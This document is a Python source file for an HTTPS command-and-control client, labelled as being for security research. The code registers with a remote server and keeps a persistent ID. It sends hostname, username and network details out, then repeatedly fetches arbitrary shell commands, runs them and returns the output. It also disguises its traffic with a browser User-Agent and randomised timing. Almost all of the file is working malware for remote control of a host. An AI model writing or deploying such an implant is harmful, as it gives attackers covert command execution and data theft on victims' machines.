# Internet-ready HTTPS C2 Client
# For legitimate security research and testing purposes

import requests
import json
import time
import uuid
import subprocess
import platform
import socket
import os
import random
import ssl
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the specific warning about unverified HTTPS requests
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class SecureClient:
    def __init__(self, server_url, verify_ssl=False, jitter=True, retry_interval=30, max_retries=10):
        self.server_url = server_url
        self.client_id = None
        self.verify_ssl = verify_ssl
        self.jitter = jitter
        self.retry_interval = retry_interval
        self.max_retries = max_retries
        self.retry_count = 0
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Load client ID from file if exists
        self.client_id_file = "client_id.txt"
        self.load_client_id()
    
    def load_client_id(self):
        """Load previously saved client ID if it exists"""
        try:
            if os.path.exists(self.client_id_file):
                with open(self.client_id_file, 'r') as f:
                    self.client_id = f.read().strip()
                print(f"Loaded existing client ID: {self.client_id}")
                return True
        except Exception as e:
            print(f"Error loading client ID: {e}")
        return False
    
    def save_client_id(self):
        """Save client ID to file for persistence"""
        try:
            with open(self.client_id_file, 'w') as f:
                f.write(self.client_id)
            return True
        except Exception as e:
            print(f"Error saving client ID: {e}")
        return False
    
    def register(self):
        """Register with the C2 server and get a client ID"""
        # If we already have a client ID, use it
        if self.client_id:
            print(f"Using existing client ID: {self.client_id}")
            return True
            
        try:
            response = requests.post(
                f"{self.server_url}/register",
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.client_id = result.get('client_id')
                    print(f"Registered with server. Client ID: {self.client_id}")
                    self.save_client_id()
                    self.retry_count = 0
                    return True
        except Exception as e:
            print(f"Registration failed: {e}")
        
        self.retry_count += 1
        return False
    
    def poll_for_commands(self):
        """Poll the server for new commands"""
        if not self.client_id:
            print("Not registered with server")
            return []
        
        data = {'client_id': self.client_id}
        
        try:
            response = requests.post(
                f"{self.server_url}/poll",
                headers=self.headers,
                json=data,
                verify=self.verify_ssl,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.retry_count = 0
                    return result.get('commands', [])
            elif response.status_code == 401:
                # Client ID invalid, need to re-register
                print("Server doesn't recognize client ID, will re-register")
                self.client_id = None
                os.remove(self.client_id_file)
                self.register()
        except Exception as e:
            print(f"Error polling for commands: {e}")
            self.retry_count += 1
        
        return []
    
    def send_response(self, cmd_id, result):
        """Send command execution results back to the server"""
        if not self.client_id:
            print("Not registered with server")
            return False
        
        data = {
            'client_id': self.client_id,
            'cmd_id': cmd_id,
            'result': result
        }
        
        try:
            response = requests.post(
                f"{self.server_url}/response",
                headers=self.headers,
                json=data,
                verify=self.verify_ssl,
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.retry_count = 0
                    return True
        except Exception as e:
            print(f"Error sending response: {e}")
            self.retry_count += 1
        
        return False
    
    def execute_command(self, command):
        """Execute a system command and return the output"""
        try:
            # Using shell=True can be a security risk in production
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=30
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Command timed out after 30 seconds'}
        except Exception as e:
            return {'error': str(e)}
    
    def get_system_info(self):
        """Collect basic system information"""
        info = {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'machine': platform.machine(),
            'username': os.getlogin(),
        }
        
        # Get network interfaces
        interfaces = []
        try:
            if platform.system() == "Windows":
                ipconfig = subprocess.run("ipconfig", shell=True, capture_output=True, text=True)
                interfaces.append(ipconfig.stdout)
            else:
                ifconfig = subprocess.run("ifconfig || ip addr", shell=True, capture_output=True, text=True)
                interfaces.append(ifconfig.stdout)
            info['network_interfaces'] = interfaces
        except:
            info['network_interfaces'] = ["Failed to retrieve network information"]
            
        return info
    
    def run_loop(self, interval=30):
        """Main client loop - poll for commands and execute them"""
        if not self.register():
            print(f"Initial registration failed. Will retry in {self.retry_interval} seconds.")
            time.sleep(self.retry_interval)
            return self.run_loop(interval)
        
        print(f"Starting command polling loop with {interval}s interval")
        
        # Send system info on first connection
        system_info = self.get_system_info()
        self.send_response("system_info", system_info)
        
        while True:
            try:
                # Exit if too many consecutive failures
                if self.retry_count > self.max_retries:
                    print(f"Max retries ({self.max_retries}) exceeded. Resetting connection...")
                    self.client_id = None
                    self.register()
                    self.retry_count = 0
                
                # Add jitter to polling interval to make traffic less predictable
                if self.jitter:
                    sleep_time = interval + random.uniform(-interval/4, interval/4)
                else:
                    sleep_time = interval
                
                time.sleep(sleep_time)
                
                commands = self.poll_for_commands()
                for cmd in commands:
                    cmd_id = cmd.get('cmd_id')
                    command = cmd.get('command')
                    
                    print(f"Executing command: {command}")
                    result = self.execute_command(command)
                    self.send_response(cmd_id, result)
                    
            except KeyboardInterrupt:
                print("Shutting down client...")
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                self.retry_count += 1
                # Don't exit loop on error, just continue

if __name__ == "__main__":
    # Default server URL (can be changed below)
    DEFAULT_SERVER_URL = "https://192.168.1.7:8443"
    
    # Allow command-line override of server URL
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    else:
        server_url = DEFAULT_SERVER_URL
    
    print(f"Connecting to server at: {server_url}")
    print("If this is incorrect, restart with the correct URL as the first argument:")
    print(f"  python {sys.argv[0]} https://your-server-ip:8443")
    
    client = SecureClient(
        server_url=server_url,
        verify_ssl=False,  # Change to True for production with valid certs
        jitter=True,
        retry_interval=30,
        max_retries=10
    )
    
    client.run_loop(interval=30)
